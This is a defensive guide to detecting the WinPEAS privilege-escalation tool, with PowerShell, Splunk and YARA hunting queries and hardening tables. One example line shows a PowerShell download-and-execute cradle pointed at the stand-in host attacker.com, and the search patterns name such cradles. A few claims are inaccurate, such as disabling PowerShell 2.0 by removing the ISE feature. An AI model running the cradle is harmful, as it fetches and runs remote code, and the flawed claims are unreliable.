# WinPEAS — Detection and Hunting

## Hunting Priority Table — Ranked by Evasion Survivability

This table ranks hunting signals by their resistance to common attacker evasion techniques (binary renaming, obfuscation, in-memory execution). **Rank 1 = most reliable, survives all evasion options; Rank 5+ = easily bypassed.**

| Rank | Signal | Evasion Options That Break It | Confidence | Effort to Hunt |
|---|---|---|---|---|
| **1** | **PE Metadata** (FileDescription, ProductName, CompanyName hardcoded in binary) | ❌ Cannot be changed without recompilation | **Very High** | Low — quick `Get-Item VersionInfo` scan |
| **2** | **Event 4104 — Script Block Logging** (full PowerShell script content) | ❌ Captured even if obfuscated; deobfuscated by PowerShell engine before logging | **Very High** (if enabled) | Low — search Event Viewer directly |
| **3** | **Sysmon Event 1** (Process creation + full command line) | ❌ Survives renaming; command line shows execution context | **High** | Medium — requires Sysmon installed and ingested |
| **4** | **Event 4688** (Process Audit, if enabled) | ❌ Command line captured; survives renaming | **High** (if enabled) | Medium — requires Domain Controller / Group Policy enforcement |
| **5** | **File name pattern matching** (`*WinPEAS*`, `*winpeas*`) | ✅ Trivially defeated by renaming to `svchost.exe`, `conhost.exe` | **Low** | Low effort, high false-negative rate |
| **6** | **Hash/Fuzzy matching** (MD5, SHA256, YARA) | ✅ Recompilation + minor code changes defeat hashing | **Medium** | Medium — requires binary recovery; easy to bypass |
| **7** | **Registry access logging** (FIM, audit trail) | ✅ Disabled by default; requires non-standard audit configuration | **Medium** | High — requires deep audit policy setup |
| **8** | **Network signature** (no network traffic) | ✅ WinPEAS makes zero network calls; cannot hunt by network IOC | **N/A** | N/A — not applicable |

---

## Hunting on Source

Hunting on the **operator's machine** (attacker's workstation, C2 infrastructure, or staging server).

### Hunt 1: Browser History for GitHub PEASS-ng Repository

**Hypothesis:** Operator downloaded WinPEAS from GitHub to their staging machine.

#### PowerShell (on operator's machine, post-seizure):
```powershell
# Chrome
$chromeHistory = "C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\History"
$conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$chromeHistory;")
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT url, title, visit_time FROM urls WHERE url LIKE '%PEASS%' OR url LIKE '%carlospolop%' ORDER BY visit_time DESC"
$reader = $cmd.ExecuteReader()
while ($reader.Read()) { Write-Host "$($reader[0]): $($reader[1])" }
$conn.Close()

# Firefox
Get-Content "C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\places.sqlite" | Select-String -Pattern "carlospolop|PEASS"
```

#### Splunk (if browser history is ingested):
```splunk
index=endpoint sourcetype=chrome_history OR sourcetype=firefox_history
| search url="*carlospolop*" OR url="*PEASS-ng*"
| stats count by user, url, visit_time
```

**Evasion survivability:** ✅ **Easily bypassed** — operators can use private-browsing mode, delete history, or download via command-line tools (curl/wget).

---

### Hunt 2: PowerShell Command History for IEX / DownloadString

**Hypothesis:** Operator used PowerShell to stage/execute WinPEAS.

#### PowerShell:
```powershell
# Check PowerShell history (PS 5.0+)
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" | Select-String -Pattern "IEX|DownloadString|WinPEAS|github.com|carlospolop"

# Example output:
# IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/WinPEAS.exe')
```

**Evasion survivability:** ❌ **Difficult to evade** — requires disabling PSReadLine history or using `Remove-Item` to clean history explicitly. Many operators forget to clean this.

#### Bash (if attacker used Bash-on-Windows or WSL):
```bash
cat ~/.bash_history ~/.zsh_history | grep -i "winpeas\|carlospolop\|IEX\|DownloadString"
```

---

### Hunt 3: C2 Server Log Analysis

**Hypothesis:** Attacker staged WinPEAS via Cobalt Strike, Sliver, or Empire C2 infrastructure.

#### Cobalt Strike TeamServer logs:
```bash
# Search TeamServer logs for execute-assembly or shell commands
grep -i "execute-assembly\|WinPEAS\|winpeas" /path/to/teamserver.log

# Expected output:
# [*] Operator executed: execute-assembly C:\Temp\WinPEAS.exe
# [+] received output (agent 1234): [WinPEAS output stream...]
```

#### Sliver server logs:
```bash
grep -i "execute\|WinPEAS" ~/.sliver/server.log
```

#### Empire database:
```bash
sqlite3 ./data/empire.db "SELECT datetime, action, result FROM history WHERE action LIKE '%WinPEAS%' OR result LIKE '%WinPEAS%';"
```

**Evasion survivability:** ❌ **Not bypassable by attacker** — if C2 infrastructure is seized, these logs are authoritative.

---

### Hunt 4: Staged File Recovery (Disk Analysis)

**Hypothesis:** WinPEAS.exe or winpeas.ps1 was left behind on staging server or jump box.

#### Local filesystem (post-seizure):
```powershell
# Search for WinPEAS binary
Get-ChildItem -Path C:\, D:\, E:\ -Recurse -Filter "*WinPEAS*" -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime

# Search for recently-downloaded files
Get-ChildItem -Path "C:\Users\*\Downloads\*" -Filter "*.exe", "*.ps1" | Where-Object { $_.LastWriteTime -gt [DateTime]::Now.AddDays(-7) }
```

#### Unallocated disk space (forensic recovery):
```bash
# Use tools like foremost, bulk_extractor, or Autopsy to recover deleted files
foremost -i /dev/sda1 -o /path/to/output -t exe
```

**Evasion survivability:** ✅ **Easily bypassed** — attacker can delete files using `Remove-Item -Force`, `cipher /w:C:` (secure wipe), or anti-forensic tools.

---

## Hunting on Target

Hunting on the **target system** where WinPEAS was executed.

### Hunt 1: Process Audit Events (Event 4688) — HIGH CONFIDENCE

**Hypothesis:** WinPEAS.exe or powershell.exe was executed; Event 4688 captures the execution.

#### PowerShell (on target, live):
```powershell
# Hunt for WinPEAS process creation
Get-WinEvent -LogName "Security" -FilterXPath "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName'] and (contains(., 'WinPEAS') or contains(., 'svchost.exe'))]]" | Select-Object TimeCreated, Message

# Hunt for PowerShell IEX execution
Get-WinEvent -LogName "Security" -FilterXPath "*[System[(EventID=4688)]] and *[EventData[Data[@Name='CommandLine'] and contains(., 'IEX')]]" | Select-Object TimeCreated, Message
```

#### Splunk:
```splunk
index=windows EventID=4688
| search NewProcessName="*WinPEAS*" OR CommandLine="*IEX*" OR CommandLine="*DownloadString*"
| stats count by NewProcessName, CommandLine, User, TimeCreated
```

**Evasion survivability:** ❌ **Cannot evade** if Event 4688 is enabled. However, Event 4688 is **disabled by default** on Windows 10/11 — requires Group Policy to enable.

---

### Hunt 2: Sysmon Event 1 (Process Creation) — HIGH CONFIDENCE

**Hypothesis:** Sysmon logged process creation; WinPEAS executed by C2 agent or shell.

#### PowerShell (if Sysmon is installed):
```powershell
Get-WinEvent -LogName "Sysmon/Operational" -FilterXPath "*[System[(EventID=1)]]" | Where-Object { $_.Message -match "WinPEAS|powershell.*IEX" } | Select-Object TimeCreated, Message | Format-Table -AutoSize

# Parse XML for parent-child relationships
[xml]$event = Get-WinEvent -LogName "Sysmon/Operational" -FilterXPath "*[System[(EventID=1)]]" -MaxEvents 1
$event.Event.EventData.Data | Where-Object { $_.Name -in "Image", "CommandLine", "ParentImage", "ParentCommandLine" }
```

#### Sysmon XML log (direct inspection):
```bash
# Search Sysmon log for WinPEAS process tree
grep -A 5 "WinPEAS" C:\Windows\System32\winevt\Logs\Sysmon.evtx (or use Event Viewer)
# Look for: Parent process (C2 agent) → Child process (WinPEAS)
```

**Evasion survivability:** ❌ **Cannot evade** if Sysmon is installed. Operator may not know Sysmon is present.

---

### Hunt 3: Script Block Logging (Event 4104) — VERY HIGH CONFIDENCE (if enabled)

**Hypothesis:** PowerShell captured the unobfuscated script execution in Event 4104.

#### PowerShell:
```powershell
Get-WinEvent -LogName "Windows PowerShell" -FilterXPath "*[System[(EventID=4104)]]" | Where-Object { $_.Message -match "WinPEAS|IEX|DownloadString|carlospolop" } | Select-Object TimeCreated, Message | Format-Table -AutoSize
```

#### Splunk:
```splunk
index=windows EventID=4104
| search Message="*WinPEAS*" OR Message="*IEX*" OR Message="*carlospolop*"
| stats count by Message, TimeCreated, User
```

**Evasion survivability:** ❌ **Cannot evade** if enabled. However, Script Block Logging requires non-default configuration (Group Policy, PowerShell registry setting). Likely only present on security-hardened systems.

**Note:** Event 4104 logs the **deobfuscated** script content, not the obfuscated version sent over the wire. Attackers cannot evade this with base64 encoding or string replacement — PowerShell's engine unwraps it before logging.

---

### Hunt 4: File-Based Hunting — PE Metadata (MEDIUM-HIGH CONFIDENCE)

**Hypothesis:** WinPEAS.exe binary is recoverable on disk (or in unallocated space) and PE metadata can be examined.

#### PowerShell (on target, if binary exists):
```powershell
# Find potential WinPEAS binaries
$exeFiles = Get-ChildItem -Path C:\Temp, $env:TEMP, C:\Windows\Temp -Recurse -Filter "*.exe" -ErrorAction SilentlyContinue

foreach ($file in $exeFiles) {
    $versionInfo = $file.VersionInfo
    if ($versionInfo.ProductName -match "WinPEAS|Privilege Escalation" -or $versionInfo.FileDescription -match "WinPEAS") {
        Write-Host "Found: $($file.FullName)"
        Write-Host "  ProductName: $($versionInfo.ProductName)"
        Write-Host "  FileDescription: $($versionInfo.FileDescription)"
        Write-Host "  InternalName: $($versionInfo.InternalName)"
    }
}
```

#### YARA scan (if YARA is available):
```bash
yara -r winpeas_rule.yar C:\Temp\ C:\Windows\Temp\ C:\$Recycle.Bin\
```

**Evasion survivability:** ✅ **Evaded by recompilation** — if attacker rebuilds WinPEAS from source, they can change ProductName, FileDescription, and CompanyName to arbitrary values (e.g., "Microsoft Corporation", "Adobe Systems"). However, recompilation is an extra step many operators skip.

---

### Hunt 5: Output File Presence — MEDIUM CONFIDENCE

**Hypothesis:** WinPEAS output file exists in temp directories (winpeas_output.txt, winpeas_report.html).

#### PowerShell:
```powershell
# Hunt for output files by name
Get-ChildItem -Path $env:TEMP, C:\Temp, C:\Windows\Temp -Recurse -Filter "*winpeas*" | Select-Object FullName, CreationTime, LastWriteTime, Length

# Examine content for telltale strings
Get-ChildItem -Path $env:TEMP, C:\Temp, C:\Windows\Temp -Recurse | Where-Object { $_.Extension -in ".txt", ".html" } | ForEach-Object {
    if (Select-String -Path $_.FullName -Pattern "SeImpersonate|UAC.*Bypass|Unquoted.*Service" -Quiet) {
        Write-Host "Potential WinPEAS output: $($_.FullName)"
    }
}
```

#### Splunk (if file metadata is ingested):
```splunk
index=endpoint sourcetype=file_metadata
| search (name="*winpeas*" OR name="*privilege*escalation*") AND (path="*Temp*" OR path="*tmp*")
| stats count by name, path, create_time, modify_time
```

**Evasion survivability:** ✅ **Easily evaded** — operator can delete output file or direct it to a non-standard location (e.g., `-html C:\Windows\System32\drivers\etc\hosts_backup.html`). File deletion survives recovery only if unallocated disk space is preserved.

---

### Hunt 6: Correlation Hunt — Timeline-Based

**Hypothesis:** Correlate process execution, file creation, and output exfiltration in a single timeline.

#### Splunk (comprehensive timeline):
```splunk
index=sysmon EventID IN (1, 11, 3)
| search (Image="*WinPEAS*" OR Image="*powershell*") OR (TargetFilename="*winpeas*") OR (DestinationPort IN (443, 53, 8080))
| timeline
| stats count by TimeCreated, EventID, Image, Message
| sort TimeCreated
```

**Expected timeline:**
```
T+0:00  Event 1 (Sysmon): PowerShell child of C2 agent
T+0:05  Event 11 (Sysmon): WinPEAS.exe created in temp
T+0:10  Event 1 (Sysmon): WinPEAS.exe executed
T+0:45  Event 11 (Sysmon): winpeas_output.txt created (enumeration complete)
T+1:00  Event 3 (Sysmon): Network connection to C2 (file exfil)
```

**Evasion survivability:** ✅ **Partially bypassed** — operator can introduce delays (run WinPEAS, wait hours before exfil), delete intermediate files, or use encryption.

---

## Hardening Mitigations

### Preventive Controls

| Control | Effectiveness | Implementation |
|---|---|---|
| **Disable PowerShell 2.0** | High | Remove `Windows-PowerShell-ISE` feature; PS 3.0+ has better logging |
| **Enable Script Block Logging (Event 4104)** | Very High | Group Policy: `Computer Configuration\Admin Templates\Windows PowerShell\Turn on PowerShell Script Block Logging` |
| **Enable Process Audit (Event 4688)** | High | Group Policy: `Computer Configuration\Windows Settings\Security Settings\Advanced Audit Policy Configuration\Detailed Tracking\Audit Process Creation` |
| **Mandatory YARA scanning** | Medium | EDR/antivirus: scan all `.exe` and `.ps1` files at creation/execution time |
| **Block known hosting domains** | Medium | Firewall: block outbound to `github.com/carlospolop`, attacker's infrastructure |
| **Memory protection (DEP, ASLR)** | Low (WinPEAS doesn't exploit memory bugs) | Built-in on modern Windows |
| **Execution policy enforcement** | Low | PowerShell: set `ExecutionPolicy = AllSigned` or `RemoteSigned` (easily bypassed via `-ExecutionPolicy Bypass`) |

### Detective Controls

| Control | Effectiveness | Implementation |
|---|---|---|
| **Sysmon installation** | Very High | Deploy Sysmon with SwiftOnSecurity rules; ingest Event 1, 11, 3 to SIEM |
| **EDR agent** | Very High | Defender for Endpoint, CrowdStrike Falcon, SentinelOne: detect known WinPEAS hashes + behavioral indicators |
| **SIEM correlation** | High | Splunk/ELK: correlate Event 4688 + file creation + network egress; alert on process trees (`IEX` → `WinPEAS`) |
| **Behavioral detection** | Medium | Hunt for rapid registry reading + file enumeration (not specific to WinPEAS, but high signal when correlated) |

---

## Quick Reference: Known WinPEAS Indicators

### PE Metadata (Unmodified Binary)
- **ProductName:** "WinPEAS"
- **FileDescription:** "Windows Privilege Escalation Awesome Script"
- **CompanyName:** (varies by build, often absent or community-set)
- **InternalName:** "WinPEAS.exe" (or `.ps1` for PowerShell version)

### File Hashes (Unmodified Binaries)
Note: These are **NOT reliable** for detection (recompilation changes hashes), but useful for binary identification post-recovery:

```
# Example SHA256 (will vary per release)
# These are illustrative; consult current GitHub releases for live hashes
```

### YARA Rule Template
```yara
rule Detect_WinPEAS_PE {
    meta:
        description = "Detects unmodified WinPEAS .exe binary"
        author = "DFIR"
    strings:
        $mz = "MZ"
        $pe1 = "Windows Privilege Escalation Awesome" nocase
        $pe2 = "SeImpersonate" nocase
        $pe3 = "UnquotedPath" nocase
    condition:
        $mz at 0 and all of ($pe*)
}

rule Detect_WinPEAS_PS {
    meta:
        description = "Detects WinPEAS PowerShell script (before obfuscation)"
        author = "DFIR"
    strings:
        $ps1 = "WinPEAS" nocase
        $ps2 = "Privilege Escalation" nocase
        $ps3 = "Get-ChildItem -Path C:\\*" nocase
    condition:
        all of them
}
```

